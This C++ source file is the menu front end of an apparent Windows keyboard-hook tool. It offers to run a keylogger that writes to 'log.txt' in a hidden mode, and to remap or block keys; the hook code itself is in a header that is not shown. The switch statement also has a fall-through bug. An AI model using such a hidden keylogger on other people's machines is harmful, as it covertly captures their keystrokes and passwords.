#include <iostream>
#include <conio.h>
#include "HookManager.h"

using namespace std;

#define F1_KEY 112

void MessageHandler(int messageNumber);
int menu();

int main()
{
    SetMessageHandler(MessageHandler);
    SetStopCode(F1_KEY);
    AddKeyLoggerFile("log.txt");
    return menu();
}

int menu()
{
    while (true)
    {
        int choise = 0;

        cout << "1 - Run programm in hidden mode." << endl
            << "2 - Run programm in normal mode." << endl
            << "3 - Change button behavior." << endl
            << "4 - Block button." << endl
            << "5 - Close programm." << endl;

        cin >> choise;

        if (cin.good() && choise >= 1 && choise <= 5)
        {
            switch (choise)
            {
            case 1:
                Run(HIDDEN_MODE);
                break;

            case 2:
                cout << "Click F1 for exit." << endl;
                Run(NORMAL_MODE);

            case 3:
                SetFlagForButtonReplacing();
                cout << "Click target button." << endl;
                Sleep(500);
                InitializeWindowsHooks();
                PressingWait(500);
                break;

            case 4:
                SetFlagForButtonBlocking();
                cout << "Click target button." << endl;
                Sleep(500);
                InitializeWindowsHooks();
                PressingWait(500);
                break;

            case 5:
                FreeWindowsHooksResourses();
                CloseKeyloggerFile();
                TerminateProcess(GetCurrentProcess(), NO_ERROR);
                return 0;
            }
        }
        else
        {
            cout << "Input error." << endl;
            cin.clear();
            cin.ignore(15, '\n');
        }
        system("pause");
        system("cls");
    }
}

void MessageHandler(int message)
{
    switch (message)
    {
        case BUTTON_WAS_BLOCKED:
            cout << "Button was successfully blocked." << endl;
            system("pause");
            system("cls");
            menu();
            break;
        case TARGET_BUTTON_ACCEPTED:
            SetFlagForContinueReplacing();
            cout << "Click button to replace." << endl;
            InitializeWindowsHooks();
            PressingWait(500);
            break;
        case BUTTON_TO_REPLACE_ACCEPTED:
            cout << "Button successfully replaced." << endl;
            system("pause");
            system("cls");
            menu();
            break;
        case HOOK_MANAGER_ERROR_MESSAGE:
            cout << "Error occured." << endl;
            system("pause");
            system("cls");
            menu();
            break;
        default:
            cout << "Warning: Unregistred message!" << endl;
    }
}